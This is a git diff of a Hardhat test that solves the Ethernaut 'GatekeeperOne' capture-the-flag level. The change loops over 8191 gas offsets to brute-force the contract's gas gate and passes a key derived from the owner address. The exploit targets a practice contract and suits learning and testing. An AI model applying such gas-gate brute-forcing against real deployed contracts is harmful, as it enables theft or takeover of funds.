@@ -12,7 +12,7 @@ let txn: any;
 let contract: Contract;
 let attackContract: Contract;
 
-describe("GatekeeperOne", () => {
+describe.only("GatekeeperOne", () => {
 
     beforeEach(async () => {
         [owner, attacker] = await ethers.getSigners();
@@ -28,12 +28,23 @@ describe("GatekeeperOne", () => {
     it("Should solve the challenge", async function () {
         expect(await submitInstance(contract.address)).to.be.false;
         
-        let gasAmount = 8191 * 5;
+        let gasAmount = 8191 * 100;
+        // last 16 chars of address to be masked
+        const txOrigin = `${owner.address.slice(-16)}`;
 
-        let gateKey = ethers.utils.keccak256(owner.address);
+        for (let i = 0; i < 8191; i++) {
+            try {
+                txn = await attackContract.attack(gasAmount + i, txOrigin, {
+                    gasLimit: gasAmount + 8191,
+                });
+                await txn.wait();
+                console.log(`worked with i = ${i}`);
+                break;
+            } catch (e) {
+                // noop
+            }
+        }
 
-        txn = await attackContract.attack(gateKey, gasAmount);
-        await txn.wait();
 
         expect(await submitInstance(contract.address), "level is not complete").to.be.true;
     });
